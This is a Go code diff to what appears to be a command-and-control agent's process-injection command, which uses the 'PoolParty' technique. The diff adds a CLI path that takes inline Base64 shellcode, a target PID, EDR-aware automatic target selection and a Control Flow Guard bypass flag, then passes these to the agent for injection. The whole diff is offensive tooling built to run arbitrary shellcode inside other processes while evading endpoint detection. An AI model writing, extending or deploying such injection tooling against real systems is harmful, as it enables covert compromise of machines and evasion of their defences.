@@ -54,6 +54,11 @@ func init() {
 						GroupName:           "New File",
 						UIModalPosition:     1,
 					},
+					{
+						ParameterIsRequired: true,
+						GroupName:           "CLI",
+						UIModalPosition:     1,
+					},
 				},
 			},
 			{
@@ -87,8 +92,24 @@ func init() {
 				},
 			},
 			{
+				Name:             "shellcode_b64",
+				ModalDisplayName: "Shellcode (Base64)",
+				CLIName:          "shellcode_b64",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				Description:      "Base64-encoded shellcode (for CLI/API usage)",
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: true,
+						GroupName:           "CLI",
+						UIModalPosition:     0,
+					},
+				},
+			},
+			{
 				Name:                 "pid",
 				ModalDisplayName:     "Target PID",
+				CLIName:              "pid",
 				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
 				Description:          "Process ID to inject into. Leave empty when using target auto-selection.",
 				DynamicQueryFunction: getProcessList,
@@ -104,11 +125,17 @@ func init() {
 						GroupName:           "New File",
 						UIModalPosition:     2,
 					},
+					{
+						ParameterIsRequired: true,
+						GroupName:           "CLI",
+						UIModalPosition:     2,
+					},
 				},
 			},
 			{
 				Name:             "target",
 				ModalDisplayName: "Target Selection",
+				CLIName:          "target",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
 				Description:      "Auto-select injection target (EDR-aware scoring). Overrides PID when set.",
 				DefaultValue:     "",
@@ -124,11 +151,17 @@ func init() {
 						GroupName:           "New File",
 						UIModalPosition:     4,
 					},
+					{
+						ParameterIsRequired: false,
+						GroupName:           "CLI",
+						UIModalPosition:     4,
+					},
 				},
 			},
 			{
 				Name:             "cfg_bypass",
 				ModalDisplayName: "CFG Bypass",
+				CLIName:          "cfg_bypass",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
 				Description:      "Mark shellcode allocation as a valid CFG call target (variants 2-8, required on Windows 10/11 with Control Flow Guard). Disable only if SetProcessValidCallTargets triggers EDR detection.",
 				DefaultValue:     true,
@@ -141,6 +174,11 @@ func init() {
 					{
 						ParameterIsRequired: false,
 						GroupName:           "New File",
+						UIModalPosition:     5,
+					},
+					{
+						ParameterIsRequired: false,
+						GroupName:           "CLI",
 						UIModalPosition:     5,
 					},
 				},
@@ -209,12 +247,28 @@ func init() {
 				return response
 			}
 
-			// Resolve file contents by checking actual args (not ParameterGroupName)
-			filename, fileContents, fErr := resolveFileContents(taskData)
-			if fErr != nil {
-				response.Success = false
-				response.Error = fErr.Error()
-				return response
+			// Check for direct base64 shellcode first (CLI/API usage)
+			var shellcodeB64 string
+			var filename string
+			sc, _ := taskData.Args.GetStringArg("shellcode_b64")
+			if sc != "" {
+				shellcodeB64 = sc
+				filename = "(inline)"
+			} else {
+				fname, fileContents, fErr := resolveFileContents(taskData)
+				if fErr != nil {
+					response.Success = false
+					response.Error = fErr.Error()
+					return response
+				}
+				filename = fname
+				shellcodeB64 = base64.StdEncoding.EncodeToString(fileContents)
+			}
+
+			// Decode to get size for display
+			scBytes, decErr := base64.StdEncoding.DecodeString(shellcodeB64)
+			if decErr != nil {
+				logging.LogError(decErr, "Failed to decode shellcode for size check")
 			}
 
 			// Get the target PID
@@ -255,14 +309,14 @@ func init() {
 
 			// Build the display parameters
 			displayParams := fmt.Sprintf("Variant: %d (%s)\nShellcode: %s (%d bytes)\nTarget PID: %d",
-				variant, variantDesc, filename, len(fileContents), pid)
+				variant, variantDesc, filename, len(scBytes), pid)
 			response.DisplayParams = &displayParams
-			createArtifact(taskData.Task.ID, "Process Inject", fmt.Sprintf("PoolParty variant %d (%s) into PID %d (%d bytes)", variant, variantDesc, pid, len(fileContents)))
+			createArtifact(taskData.Task.ID, "Process Inject", fmt.Sprintf("PoolParty variant %d (%s) into PID %d (%d bytes)", variant, variantDesc, pid, len(scBytes)))
 
 			// Build the actual parameters JSON that will be sent to the agent
 			cfgBypass, _ := taskData.Args.GetBooleanArg("cfg_bypass")
 			params := map[string]interface{}{
-				"shellcode_b64": base64.StdEncoding.EncodeToString(fileContents),
+				"shellcode_b64": shellcodeB64,
 				"pid":           pid,
 				"variant":       variant,
 				"cfg_bypass":    cfgBypass,
